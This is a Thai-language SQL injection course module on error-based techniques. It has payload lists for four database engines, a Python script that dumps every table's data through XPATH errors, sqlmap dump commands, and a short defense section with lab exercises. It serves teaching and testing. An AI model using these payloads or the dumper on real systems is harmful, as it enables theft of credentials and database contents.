# Part 012: Error-Based SQL Injection (การดึงข้อมูลผ่าน Error Messages)

## ภาพรวม (Overview)

Error-based SQL Injection เป็นเทคนิคที่ใช้ error messages จาก database เพื่อดึงข้อมูลออกมา เป็นเทคนิคที่ง่ายและรวดเร็วที่สุดเมื่อ application แสดง error messages

**ขั้นตอนที่ 111-125 ในหลักสูตรนี้**

---

## 111. ทำความเข้าใจ Error-Based SQLi

### 11.1 หลักการทำงาน

เมื่อ database พบ syntax error หรือ logic error มันจะส่ง error message กลับมา ถ้า application แสดง error message เหล่านี้โดยตรง เราสามารถ manipulate query เพื่อให้ error message มีข้อมูลที่เราต้องการ

```
Application Query:
SELECT * FROM users WHERE id = '[INPUT]'

Input: ' AND extractvalue(1,concat(0x7e,version()))--
Result Query: SELECT * FROM users WHERE id = '' AND extractvalue(1,concat(0x7e,version()))--'

Error Message: XPATH syntax error: '~5.7.38-MySQL Community Server'
              ^ ข้อมูล version ถูก embed อยู่ใน error message
```

### 11.2 เงื่อนไขที่จำเป็น

1. Application ต้องแสดง database error messages
2. ต้องมีช่องโหว่ SQL Injection
3. Query ที่ inject ต้องสร้าง error ที่มีข้อมูลอยู่ใน message

---

## 112. MySQL Error-Based Functions

### 12.1 ExtractValue Function

```sql
-- Syntax
extractvalue(xml_document, xpath_expression)

-- เมื่อ xpath_expression ไม่ถูกต้อง จะเกิด error ที่มีข้อมูล
extractvalue(1, concat(0x7e, payload))

-- 0x7e คือ ~ ทำให้ xpath ไม่ถูกต้อง
```

**Payloads พื้นฐาน:**

```sql
-- ดู version
' AND extractvalue(1,concat(0x7e,version()))--

-- ดู database ปัจจุบัน
' AND extractvalue(1,concat(0x7e,database()))--

-- ดู user ปัจจุบัน
' AND extractvalue(1,concat(0x7e,user()))--

-- ดูชื่อ databases ทั้งหมด
' AND extractvalue(1,concat(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1)))--

-- ดูชื่อ tables
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))--

-- ดูชื่อ columns
' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))--

-- ดูข้อมูลใน column
' AND extractvalue(1,concat(0x7e,(SELECT username FROM users LIMIT 0,1)))--
```

**ข้อจำกัด:** ExtractValue จะแสดงข้อมูลได้แค่ 32 characters ต่อครั้ง

```sql
-- ดูข้อมูลยาวๆ ด้วย substr/mid
' AND extractvalue(1,concat(0x7e,substr((SELECT password FROM users LIMIT 0,1),1,30)))--
' AND extractvalue(1,concat(0x7e,substr((SELECT password FROM users LIMIT 0,1),31,30)))--
```

### 12.2 UpdateXML Function

```sql
-- Syntax
updatexml(xml_document, xpath_expression, new_value)

-- ตัวอย่าง
' AND updatexml(1,concat(0x7e,(SELECT version())),1)--
```

**Payloads:**

```sql
-- ดู version
' AND updatexml(1,concat(0x7e,version()),1)--

-- ดู database
' AND updatexml(1,concat(0x7e,database()),1)--

-- ดู tables
' AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())),1)--

-- ดู columns
' AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')),1)--

-- ดูข้อมูล
' AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)),1)--
```

### 12.3 Geometry Functions

```sql
-- ST_LatFromGeoHash (MySQL 5.7.x)
' AND ST_LatFromGeoHash(concat(0x7e,(SELECT version())))--

-- PolygonFromText
' AND PolygonFromText(concat(0x7e,(SELECT database())))--

-- GeometryCollection
' AND GeometryCollection((SELECT * FROM(SELECT * FROM(SELECT version())a)b))--
```

### 12.4 BIGINT Overflow

```sql
-- ทำให้เกิด integer overflow เพื่อแสดงข้อมูล
' AND (SELECT 1 FROM(SELECT COUNT(*),concat((SELECT database()),0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- หรือแบบย่อ
' AND exp(~(SELECT * FROM(SELECT version())a))--
```

---

## 113. MSSQL Error-Based Techniques

### 13.1 Convert/Cast Error

```sql
-- CONVERT จะ error เมื่อ type ไม่ตรงกัน
' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- CAST
' AND 1=cast((SELECT TOP 1 table_name FROM information_schema.tables) as int)--
```

**ข้อมูลที่ดึงได้:**

```sql
-- version
' AND 1=convert(int,@@version)--

-- database
' AND 1=convert(int,db_name())--

-- user
' AND 1=convert(int,system_user)--

-- tables
' AND 1=convert(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--

-- columns
' AND 1=convert(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--

-- data
' AND 1=convert(int,(SELECT TOP 1 username+':'+password FROM users))--
```

### 13.2 FOR XML PATH Error

```sql
-- ใช้ FOR XML เพื่อดึงข้อมูลหลาย rows
' AND 1=convert(int,(SELECT (SELECT username+':'+password+' ' FROM users FOR XML PATH(''))))--
```

### 13.3 Subquery Error

```sql
-- subquery ที่ return มากกว่า 1 row จะ error
' AND 1=(SELECT username FROM users)--
-- Error: Subquery returned more than 1 value
```

---

## 114. Oracle Error-Based Techniques

### 14.1 UTL_INADDR.GET_HOST_NAME

```sql
-- ดู version
' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--

-- ดู user
' AND 1=utl_inaddr.get_host_name((SELECT username FROM all_users WHERE rownum=1))--
```

### 14.2 CTXSYS.DRITHSX.SN

```sql
-- Function ที่ทำให้เกิด error พร้อมข้อมูล
' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

### 14.3 XMLType

```sql
-- XMLType ที่ผิดรูปแบบ
' AND (SELECT UPPER(XMLType(chr(60)||chr(58)||chr(58)||(SELECT banner FROM v$version WHERE rownum=1)||chr(58)||chr(58)||chr(62))) FROM dual) IS NOT NULL--
```

---

## 115. PostgreSQL Error-Based Techniques

### 15.1 CAST Error

```sql
-- PostgreSQL CAST error
' AND CAST((SELECT version()) AS int)--
-- Error: invalid input syntax for type integer: "PostgreSQL 12.x..."
```

### 15.2 Operator Error

```sql
-- ใช้ operator ที่ไม่ compatible
' AND 1=1::text--

-- pg_input_is_valid
' AND 1::int=(SELECT 1 FROM pg_sleep(0) WHERE (SELECT version()) IS NOT NULL)--
```

---

## 116. ข้อจำกัดและวิธีแก้ (Limitations and Solutions)

### 16.1 ข้อจำกัดของ Character Limit

ExtractValue และ UpdateXML มีขีดจำกัด ~32 characters

**วิธีแก้ด้วย SUBSTR:**

```sql
-- ดึงข้อมูล 30 chars ต่อครั้ง
-- Request 1: chars 1-30
' AND extractvalue(1,concat(0x7e,substr((SELECT password FROM users WHERE id=1),1,30)))--

-- Request 2: chars 31-60
' AND extractvalue(1,concat(0x7e,substr((SELECT password FROM users WHERE id=1),31,30)))--

-- Request 3: chars 61-90
' AND extractvalue(1,concat(0x7e,substr((SELECT password FROM users WHERE id=1),61,30)))--
```

**วิธีแก้ด้วย GROUP_CONCAT (MySQL):**

```sql
-- รวมข้อมูลหลาย rows เป็น string เดียว
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(username separator 0x0a) FROM users)))--
```

### 16.2 ข้อมูลที่มีช่องว่างหรือ special chars

```sql
-- ใช้ HEX encoding
' AND extractvalue(1,concat(0x7e,hex((SELECT password FROM users LIMIT 0,1))))--

-- แล้ว decode hex เป็น text ในภายหลัง
```

---

## 117. การดึงข้อมูลแบบ Step-by-Step (Step-by-Step Data Extraction)

### Step 1: ตรวจสอบว่าเป็น Error-based

```sql
-- ทดสอบ basic error
' AND extractvalue(1,'~')--
-- ควรได้: XPATH syntax error: '~'
```

### Step 2: ดึงข้อมูล Database

```sql
-- Database version
' AND extractvalue(1,concat(0x7e,version()))--
-- ผล: XPATH syntax error: '~5.7.38-MySQL Community Server'

-- Database name
' AND extractvalue(1,concat(0x7e,database()))--
-- ผล: XPATH syntax error: '~myapp_db'

-- Database user
' AND extractvalue(1,concat(0x7e,user()))--
-- ผล: XPATH syntax error: '~webapp@localhost'
```

### Step 3: ดึง Table Names

```sql
-- Table แรก
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))--

-- Table ที่สอง
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)))--

-- Table ทั้งหมด (GROUP_CONCAT)
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name separator ',') FROM information_schema.tables WHERE table_schema=database())))--
```

### Step 4: ดึง Column Names

```sql
-- Columns ของ table users
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(column_name separator ',') FROM information_schema.columns WHERE table_name='users')))--
-- ผล: '~id,username,password,email,role'
```

### Step 5: ดึง Data

```sql
-- ดึงข้อมูล users
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password separator '|') FROM users)))--
-- ผล: '~admin:5f4dcc3b5aa765d61d8327deb882cf99|user1:abc123...'
```

---

## 118. Python Script สำหรับ Error-Based Extraction

```python
#!/usr/bin/env python3
"""
Error-Based SQL Injection Data Extractor
สำหรับการศึกษาและทดสอบ security เท่านั้น
"""

import requests
import re
import sys

class ErrorBasedExtractor:
    def __init__(self, url, param, cookie=None):
        self.url = url
        self.param = param
        self.session = requests.Session()
        if cookie:
            self.session.cookies.update(cookie)
    
    def inject(self, payload):
        """ส่ง payload และดึง error message"""
        params = {self.param: f"1 AND {payload}-- -"}
        r = self.session.get(self.url, params=params)
        
        patterns = [
            r"XPATH syntax error: '~(.+?)'",
            r"XPATH syntax error: '(.+?)'",
        ]
        
        for pattern in patterns:
            match = re.search(pattern, r.text)
            if match:
                return match.group(1).strip('~')
        
        return None
    
    def get_version(self):
        """ดึง database version"""
        result = self.inject("extractvalue(1,concat(0x7e,version()))")
        print(f"[+] Version: {result}")
        return result
    
    def get_database(self):
        """ดึงชื่อ database ปัจจุบัน"""
        result = self.inject("extractvalue(1,concat(0x7e,database()))")
        print(f"[+] Database: {result}")
        return result
    
    def get_user(self):
        """ดึง database user"""
        result = self.inject("extractvalue(1,concat(0x7e,user()))")
        print(f"[+] User: {result}")
        return result
    
    def get_tables(self, db=None):
        """ดึงรายชื่อ tables ทั้งหมด"""
        if db:
            payload = f"extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name separator ',') FROM information_schema.tables WHERE table_schema='{db}')))"
        else:
            payload = "extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name separator ',') FROM information_schema.tables WHERE table_schema=database())))"
        
        result = self.inject(payload)
        if result:
            tables = result.split(',')
            print(f"[+] Tables: {tables}")
            return tables
        return []
    
    def get_columns(self, table):
        """ดึงรายชื่อ columns ของ table"""
        payload = f"extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(column_name separator ',') FROM information_schema.columns WHERE table_name='{table}')))"
        result = self.inject(payload)
        if result:
            columns = result.split(',')
            print(f"[+] Columns in {table}: {columns}")
            return columns
        return []
    
    def get_data(self, table, columns, limit=10):
        """ดึงข้อมูลจาก table"""
        col_str = ',0x3a,'.join([f"({col})" for col in columns])
        payload = f"extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT({col_str} separator '|') FROM {table} LIMIT {limit})))"
        result = self.inject(payload)
        
        if result:
            rows = result.split('|')
            print(f"\n[+] Data from {table}:")
            for row in rows:
                values = row.split(':')
                row_data = dict(zip(columns, values))
                print(f"    {row_data}")
            return rows
        return []
    
    def dump_all(self):
        """ดึงข้อมูลทั้งหมด"""
        print("[*] Starting Error-Based SQL Injection extraction...")
        print("-" * 60)
        
        version = self.get_version()
        db = self.get_database()
        user = self.get_user()
        
        print("\n[*] Enumerating tables...")
        tables = self.get_tables(db)
        
        for table in tables:
            print(f"\n[*] Processing table: {table}")
            columns = self.get_columns(table)
            if columns:
                self.get_data(table, columns[:3])


if __name__ == "__main__":
    extractor = ErrorBasedExtractor(
        url="http://testphp.vulnweb.com/artists.php",
        param="artist"
    )
    extractor.dump_all()
```

---

## 119. Automated Error-Based with SQLMap

```bash
# Basic error-based SQLi
sqlmap -u "http://example.com/item?id=1" --technique=E

# ดึง databases
sqlmap -u "http://example.com/item?id=1" --technique=E --dbs

# ดึง tables
sqlmap -u "http://example.com/item?id=1" --technique=E -D mydb --tables

# ดึง columns
sqlmap -u "http://example.com/item?id=1" --technique=E -D mydb -T users --columns

# dump ข้อมูล
sqlmap -u "http://example.com/item?id=1" --technique=E -D mydb -T users --dump

# ใช้ POST request
sqlmap -u "http://example.com/login" --data="username=test&password=test" --technique=E

# ใช้ cookie
sqlmap -u "http://example.com/profile" --cookie="session=abc123" --technique=E
```

---

## 120. การป้องกัน (Defense/Mitigation)

### 20.1 Prepared Statements (PHP)

```php
// ไม่ดี - เสี่ยงต่อ SQL Injection
$query = "SELECT * FROM users WHERE id = '$id'";

// ดี - ใช้ Prepared Statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
$result = $stmt->fetchAll();
```

### 20.2 Parameterized Queries (Python)

```python
# ไม่ดี
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)

# ดี - ใช้ parameterized query
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

### 20.3 Error Handling

```php
// ซ่อน error messages จาก users
try {
    $result = $pdo->query($query);
} catch (PDOException $e) {
    // Log error ใน server log (ไม่แสดงให้ user เห็น)
    error_log($e->getMessage());
    // แสดง generic error message
    echo "An error occurred. Please try again.";
}
```

### 20.4 Display Errors Configuration (PHP)

```php
// php.ini หรือ .htaccess
display_errors = Off
log_errors = On
error_log = /var/log/php_errors.log
```

---

## แบบฝึกหัด (Exercises)

### Exercise 1: DVWA Error-Based

1. ตั้งค่า DVWA (Low security)
2. ไปที่ SQL Injection module
3. ทดสอบ payloads:

```
1' AND extractvalue(1,concat(0x7e,version()))--
1' AND extractvalue(1,concat(0x7e,database()))--
1' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))--
```

4. บันทึกผลลัพธ์และอธิบายสิ่งที่พบ

### Exercise 2: SQLi-Labs

```bash
# Clone SQLi-Labs
git clone https://github.com/Audi-1/sqli-labs
cd sqli-labs

# รัน Docker
docker build -t sqli-labs .
docker run -d -p 80:80 sqli-labs
```

ทดสอบ Less-1 ถึง Less-5 ด้วย error-based techniques

### Exercise 3: Python Script

ดัดแปลง script ใน section 118 เพื่อ:
1. รับ URL และ parameter จาก command line
2. ทดสอบ error-based injection
3. ดึงข้อมูล version, database, tables
4. แสดงผลลัพธ์ในรูปแบบที่อ่านง่าย

---

## สรุป (Summary)

Error-based SQL Injection เป็นเทคนิคที่:
- **รวดเร็ว** - ได้ข้อมูลจาก error messages โดยตรง
- **ง่าย** - ไม่ต้องเดา true/false
- **จำกัด** - ต้องการ application ที่แสดง error messages
- **ตรวจจับง่าย** - ทิ้งร่องรอยใน server logs

Functions ที่ใช้บ่อย:
- MySQL: `extractvalue()`, `updatexml()`
- MSSQL: `convert()`, `cast()`
- Oracle: `utl_inaddr.get_host_name()`
- PostgreSQL: `cast()`

---

*Part 012 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
